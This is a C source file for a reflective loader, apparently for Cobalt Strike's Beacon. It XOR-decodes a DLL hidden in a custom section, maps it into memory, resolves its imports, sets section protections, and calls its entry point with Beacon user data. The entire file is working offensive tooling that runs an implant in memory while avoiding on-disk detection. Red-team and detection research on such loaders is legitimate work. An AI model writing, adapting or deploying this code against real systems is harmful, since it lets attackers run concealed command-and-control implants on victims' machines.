#include <windows.h>
#include "beacon.h"
#include "tcg.h"
#include "loader.h"

DECLSPEC_IMPORT LPVOID WINAPI  KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL   WINAPI  KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT LPVOID WINAPIV MSVCRT$malloc           ( size_t );
DECLSPEC_IMPORT void   WINAPIV MSVCRT$free             ( LPVOID );

__typeof__ ( GetModuleHandleA ) * pGetModuleHandle __attribute__ ( ( section ( ".text" ) ) );
__typeof__ ( GetProcAddress   ) * pGetProcAddress  __attribute__ ( ( section ( ".text" ) ) );

char __DLLDATA__ [ 0 ] __attribute__ ( ( section ( "dll_data" ) ) );
char __KEYDATA__ [ 0 ] __attribute__ ( ( section ( "key_data" ) ) );

FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
{
    HANDLE module = findModuleByHash ( mod_hash );
    return findFunctionByHash ( module, func_hash );
}

FARPROC smart_resolve ( char * mod_name, char * func_name )
{
    HANDLE module = pGetModuleHandle ( mod_name );

    if ( module == NULL ) {
        module = LoadLibraryA ( mod_name );
    }

    return pGetProcAddress ( module, func_name );
}

#ifdef WIN_X86
__declspec ( noinline ) ULONG_PTR caller ( VOID ) { return ( ULONG_PTR ) WIN_GET_CALLER ( ); }
#endif

void go ( )
{
    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( __DLLDATA__ );
    RESOURCE * xor_key    = ( RESOURCE * ) GETRESOURCE ( __KEYDATA__ );

    char * dll_src = MSVCRT$malloc ( masked_dll->length );

    for ( size_t i = 0; i < masked_dll->length; i++ ) {
        dll_src [ i ] = masked_dll->value [ i ] ^ xor_key->value [ i % xor_key->length ];
    }

    DLLDATA dll_data;
    ParseDLL ( dll_src, &dll_data );

    USER_DATA bud;
    ALLOCATED_MEMORY memory;
    
    memset ( &bud, 0, sizeof ( USER_DATA ) );
    memset ( &memory, 0, sizeof ( ALLOCATED_MEMORY ) );

    bud.version = 0x041200;
    bud.allocatedMemory = &memory;

    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
    LoadDLL ( &dll_data, dll_src, dll_dst );

    ALLOCATED_MEMORY_CLEANUP_INFORMATION cleanup_info;
    memset ( &cleanup_info, 0, sizeof ( ALLOCATED_MEMORY_CLEANUP_INFORMATION ) );

    cleanup_info.AllocationMethod = METHOD_VIRTUALALLOC;
    cleanup_info.Cleanup          = TRUE;

    memory.AllocatedMemoryRegions[0].Purpose            = PURPOSE_BEACON_MEMORY;
    memory.AllocatedMemoryRegions[0].AllocationBase     = dll_dst;
    memory.AllocatedMemoryRegions[0].RegionSize         = SizeOfDLL ( &dll_data );
    memory.AllocatedMemoryRegions[0].Type               = MEM_PRIVATE;
    memory.AllocatedMemoryRegions[0].CleanupInformation = cleanup_info;

    IMPORTFUNCS  funcs;
    funcs.GetProcAddress = GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;

    ProcessImports ( &funcs, &dll_data, dll_dst );
    fix_section_permissions ( &dll_data, dll_dst, &memory.AllocatedMemoryRegions [ 0 ] );

    DLLMAIN_FUNC dll_main = EntryPoint ( &dll_data, dll_dst );

    MSVCRT$free ( dll_src );
    
    dll_main ( ( HINSTANCE ) NULL, DLL_BEACON_USER_DATA, &bud );
    dll_main ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
    dll_main ( ( HINSTANCE ) &go, 4, NULL );
}

void fix_section_permissions ( DLLDATA * dll_data, char * dll_dst, ALLOCATED_MEMORY_REGION * region )
{
    DWORD section_count = dll_data->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll_data->OptionalHeader, dll_data->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( size_t i = 0; i < section_count; i++ )
    {
        void * section_dst = dll_dst + section_hdr->VirtualAddress;
        DWORD section_size = section_hdr->SizeOfRawData;
        
        DWORD new_protect;
        DWORD old_protect;

        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) {
            new_protect = PAGE_WRITECOPY;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) {
            new_protect = PAGE_READONLY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_READWRITE;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            new_protect = PAGE_EXECUTE;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
            new_protect = PAGE_EXECUTE_WRITECOPY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
            new_protect = PAGE_EXECUTE_READ;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
            new_protect = PAGE_EXECUTE_READWRITE;
        }

        KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );
        
        region->Sections[i].Label           = get_label_from_section_header ( section_hdr );
        region->Sections[i].BaseAddress     = section_dst;
        region->Sections[i].VirtualSize     = section_size;
        region->Sections[i].CurrentProtect  = new_protect;
        region->Sections[i].PreviousProtect = new_protect;
        region->Sections[i].MaskSection     = TRUE;

        section_hdr++;
    }
}

ALLOCATED_MEMORY_LABEL get_label_from_section_header ( IMAGE_SECTION_HEADER * section_hdr )
{
    DWORD hash = ror13hash ( ( const char * ) section_hdr->Name );

    switch ( hash )
    {
    case 0xebc2f9b4:
        return LABEL_TEXT;
    
    case 0xcba738b8:
        return LABEL_RDATA;

    case 0xcba2f8a1:
        return LABEL_DATA;

    case 0xcba718b8:
        return LABEL_PDATA;
    
    case 0xcd7f3b7a:
        return LABEL_RELOC;
    
    default:
        return LABEL_EMPTY;
    }
}
